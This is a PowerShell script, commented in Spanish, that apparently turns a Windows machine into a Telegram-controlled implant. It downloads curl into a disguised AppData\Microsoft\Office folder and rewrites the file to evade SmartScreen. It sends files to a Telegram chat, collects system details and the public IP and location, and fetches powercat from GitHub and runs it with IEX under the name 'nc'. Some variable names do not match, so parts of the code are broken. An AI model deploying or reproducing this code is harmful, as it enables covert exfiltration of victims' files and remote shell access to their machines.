
function envia-mensaje { param ($botkey,$chat,$text)Invoke-Webrequest -uri "https://api.telegram.org/bot$botkey/sendMessage?chat_id=$chat_id&text=$texto" -Method post}

function Disable-Smartscreen {param ($File,$Output) $archivo = get-item $file ; $file = [io.file]::ReadAllBytes($File) ; [io.file]::WriteAllBytes($output,$file) }

function bot-send {

param ($photo,$file,$botkey,$chat_id,$screenshot)

$ruta = $env:USERPROFILE + "\appdata\local\Microsoft\Office"
$curl = $ruta + "\" + "curl.exe"
$curl_mod = $ruta + "\" + "curl_mod.exe"
if ( (Test-Path $ruta) -eq $false) {mkdir $ruta} else {}
if ( (Test-Path $curl) -eq $false ) {
$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("https://github.com/cybervaca/psbotelegram/raw/master/curl.exe","$curl")

Disable-Smartscreen -File $curl -Output $curl_mod
Remove-Item $curl
}

if ($file -ne $null) {
$proceso = $curl_mod
Write-Host $proceso
$uri = "https://api.telegram.org/bot" + $botkey + "/sendDocument"
$argumenlist = $uri + ' -F chat_id=' + "$chat_id" + ' -F document=@' + $file  + ' -k '
Write-Host $argumenlist

Start-Process $proceso -ArgumentList $argumenlist }

}

function get-info {$OS = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME 
$Bios = Get-WmiObject -Class Win32_BIOS -ComputerName $env:COMPUTERNAME 
$sheetS = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $env:COMPUTERNAME 
$sheetPU = Get-WmiObject -Class Win32_Processor -ComputerName $env:COMPUTERNAME 
$drives = Get-WmiObject -ComputerName $env:COMPUTERNAME Win32_LogicalDisk  | Where-Object {$_.DriveType -eq 3}
$pingStatus = Get-WmiObject  -Query "Select * from win32_PingStatus where Address='$env:COMPUTERNAME'  "
$IPAddress= (Get-WmiObject Win32_NetworkAdapterConfiguration -ComputerName $env:COMPUTERNAME  | ? {$_.ipenabled}).ipaddress 
$OSRunning = $OS.caption + " " + $OS.OSArchitecture + " SP " + $OS.ServicePackMajorVersion
$NoOfProcessors=$sheetS.numberofProcessors
$name=$SheetPU|select name -First 1
$Manufacturer=$sheetS.Manufacturer
$Model=$sheetS.Model

$PC = New-Object psobject -Property @{ 
"Nombre" = $env:COMPUTERNAME
"Modelo Monitor" = $MonitorModelo
"Monitor Num. Serie" = $MonitorSerial
"Sistema Operativo" = $OSRunning
"Procesador" = $name.name
"Fabricante" = $Manufacturer
"Modelo" = $Model
"Num. Procesadores" = "$NoOfProcessors"
"Memoria RAM" = "$ram_round Gb"
"Direccion IP" = [string]$IPAddress[0]
"MAC" = $mac
"Numero de serie" = $serialnumer
"Disco Duro" = $Disco_duro
}

################################## Exportamos los datos del equipo que esta pasando por el "FOR" al csv ##############################################


$PC | select-Object Nombre, "Modelo Monitor", "Monitor Num. Serie", "Sistema Operativo", "Procesador", "Fabricante", "Modelo", "Num. Procesadores", "Memoria RAM", "Disco Duro", "Direccion IP", "MAC", "Numero de Serie" 
}
function public-ip {$datos_ip_publica = Invoke-WebRequest -Uri http://ifconfig.co/json; $resultado = New-Object psobject -Property @{"IP"= $datos_ip_publica.ip
 "Pai­s" = $datos_ip_publica.country
 "Ciudad" = $datos_ip_publica.city} ; $resultado | Select-Object IP, Pai­s, Ciudad}

function bot-public {$getUpdatesLink = "https://api.telegram.org/bot$botkey/getUpdates" ; $Obtenemos_datos_actualizados = (invoke-WebRequest -Uri $getUpdatesLink -Method post).content ; $Obtenemos_datos_actualizados = $Obtenemos_datos_actualizados -split "," ; $chat_id =  $Obtenemos_datos_actualizados | Select-String "chat"; $chat_id = $chat_id[0] -replace '"chat":{"id":' ; $chat_id_result = New-Object psobject -Property @{"chat_id"= $chat_id} ; $chat_id_result | Select-Object chat_id}

$powercat = (curl "https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1").content -replace "function powercat","function nc" ; IEX $powercat

function screen-shot {}
